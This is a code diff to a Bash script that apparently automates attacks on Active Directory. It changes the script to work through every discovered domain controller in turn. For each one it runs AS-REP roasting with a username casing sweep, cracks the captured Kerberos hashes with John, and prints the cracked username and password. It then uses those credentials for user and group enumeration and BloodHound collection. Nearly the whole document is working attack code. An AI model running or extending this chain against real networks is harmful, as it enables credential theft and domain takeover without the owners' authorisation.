@@ -183,6 +183,16 @@ recon_dc() {
 }
 
 # ------------------------------------------------------------
+# Helper: derive domain from DC
+# ------------------------------------------------------------
+domain_for_dc() {
+    local dc="$1"
+    ldapsearch -x -LLL -H "ldap://$dc" -s base -b "" namingContexts 2>/dev/null \
+        | awk -F': ' '/^namingContexts:/ {print $2; exit}' \
+        | sed -E 's/^DC=//I; s/,DC=/./gI'
+}
+
+# ------------------------------------------------------------
 # Phase 4: AS-REP roasting with casing sweep
 # ------------------------------------------------------------
 asrep_roast() {
@@ -207,7 +217,7 @@ asrep_roast() {
         return 1
     fi
 
-    echo "[*] === AS-REP roasting $domain ===" >&2
+    echo "[*] === AS-REP roasting $domain (DC: $dc) ===" >&2
 
     awk '{print tolower($0)}' "$wordlist" > /tmp/adscope_users_lower.txt
     awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' "$wordlist" > /tmp/adscope_users_title.txt
@@ -334,9 +344,6 @@ crack_asrep() {
 
 # ------------------------------------------------------------
 # Helper: parse John's cracked.txt to extract bare username
-# Handles both formats:
-#   $krb5asrep$23$user@DOMAIN:password   (raw hash output)
-#   $krb5asrep$user@DOMAIN:password      (John's --show output)
 # ------------------------------------------------------------
 parse_cracked_user() {
     local cracked_file="$1"
@@ -537,15 +544,20 @@ collect_bloodhound_inner() {
     local outdir="recon_${dc_ip//./_}"
     local bh_dir="$outdir/bloodhound"
 
-    bloodhound-python \
-        -d "$domain" \
-        -u "$username" \
-        -p "$password" \
-        -dc "$dc_fqdn" \
-        -ns "$dc_ip" \
-        -c DCOnly \
-        -o "$bh_dir" \
-        --zip 2>&1 | tee "$outdir/bloodhound_collect.log"
+    # Run inside bh_dir so --zip lands there (bloodhound-python
+    # writes the ZIP to CWD regardless of -o when --zip is used)
+    (
+        cd "$bh_dir" || exit 1
+        bloodhound-python \
+            -d "$domain" \
+            -u "$username" \
+            -p "$password" \
+            -dc "$dc_fqdn" \
+            -ns "$dc_ip" \
+            -c DCOnly \
+            -o . \
+            --zip
+    ) 2>&1 | tee "$outdir/bloodhound_collect.log"
 
     if ls "$bh_dir"/*.zip >/dev/null 2>&1; then
         local zipfile
@@ -666,60 +678,79 @@ if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
     echo "[*] DC candidates written to dc_candidates.txt"
     echo
 
-    FIRST_DC=$(head -1 dc_candidates.txt)
-    DOMAIN=$(ldapsearch -x -LLL -H "ldap://$FIRST_DC" -s base -b "" namingContexts 2>/dev/null \
-        | awk -F': ' '/^namingContexts:/ {print $2; exit}' \
-        | sed -E 's/^DC=//I; s/,DC=/./gI')
-
-    echo "[*] Detected domain: ${DOMAIN:-unknown}"
-    echo
-
-    # Phase 3 per DC
+    # Phase 3: recon all DCs first
     while read -r dc; do
         recon_dc "$dc"
         echo
     done < dc_candidates.txt
 
-    # Phase 4
-    if [[ -n "$WORDLIST" ]] && [[ -n "$DOMAIN" ]]; then
-        asrep_roast "$FIRST_DC" "$DOMAIN" "$WORDLIST"
+    # Phase 4-7: iterate per DC
+    while read -r dc; do
+        [[ -z "$dc" ]] && continue
+
+        DOMAIN=$(domain_for_dc "$dc")
+
+        echo "============================================================"
+        echo "[*] Processing DC $dc (domain: ${DOMAIN:-unknown})"
+        echo "============================================================"
         echo
 
-        # Phase 5
-        HASHFILE="recon_${FIRST_DC//./_}/asrep_all.hashes"
-        CRACKED_OUT="recon_${FIRST_DC//./_}/cracked.txt"
-
-        if [[ -s "$HASHFILE" ]]; then
-            crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
+        if [[ -z "$DOMAIN" ]]; then
+            echo "[!] Could not determine domain for $dc — skipping." >&2
             echo
+            continue
+        fi
 
-            # Phase 6 & 7 — requires cracked creds
-            if [[ -s "$CRACKED_OUT" ]]; then
-                CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
-                CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")
+        if [[ -z "$WORDLIST" ]]; then
+            echo "[!] No wordlist — skipping AS-REP roast for $dc." >&2
+            echo
+            continue
+        fi
 
-                if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
-                    echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
-                    echo
+        # Phase 4: AS-REP roast
+        asrep_roast "$dc" "$DOMAIN" "$WORDLIST"
+        echo
 
-                    # Phase 6
-                    enumerate_users_groups "$FIRST_DC" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
-                    echo
+        HASHFILE="recon_${dc//./_}/asrep_all.hashes"
+        CRACKED_OUT="recon_${dc//./_}/cracked.txt"
 
-                    # Phase 7 — resolve FQDN first
-                    DC_HOSTNAME=$(resolve_dc_fqdn "$FIRST_DC" "$DOMAIN")
+        if [[ ! -s "$HASHFILE" ]]; then
+            echo "[-] No hashes to crack for $dc — moving on." >&2
+            echo
+            continue
+        fi
 
-                    if [[ -n "$DC_HOSTNAME" ]]; then
-                        echo "[*] DC FQDN: $DC_HOSTNAME" >&2
-                        collect_bloodhound "$FIRST_DC" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
-                    else
-                        echo "[!] Could not resolve DC hostname — skipping BloodHound." >&2
-                        echo "[!] Try manually: dig @$FIRST_DC -x $FIRST_DC" >&2
-                    fi
+        # Phase 5: crack
+        crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
+        echo
+
+        # Phase 6 & 7: require cracked creds
+        if [[ -s "$CRACKED_OUT" ]]; then
+            CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
+            CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")
+
+            if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
+                echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
+                echo
+
+                # Phase 6
+                enumerate_users_groups "$dc" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+                echo
+
+                # Phase 7
+                DC_HOSTNAME=$(resolve_dc_fqdn "$dc" "$DOMAIN")
+
+                if [[ -n "$DC_HOSTNAME" ]]; then
+                    echo "[*] DC FQDN: $DC_HOSTNAME" >&2
+                    collect_bloodhound "$dc" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+                else
+                    echo "[!] Could not resolve DC hostname for $dc — skipping BloodHound." >&2
+                    echo "[!] Try manually: dig @$dc -x $dc" >&2
                 fi
+                echo
             fi
         fi
-    fi
+    done < dc_candidates.txt
 else
     echo "[!] No DCs identified. Stopping here."
     exit 1
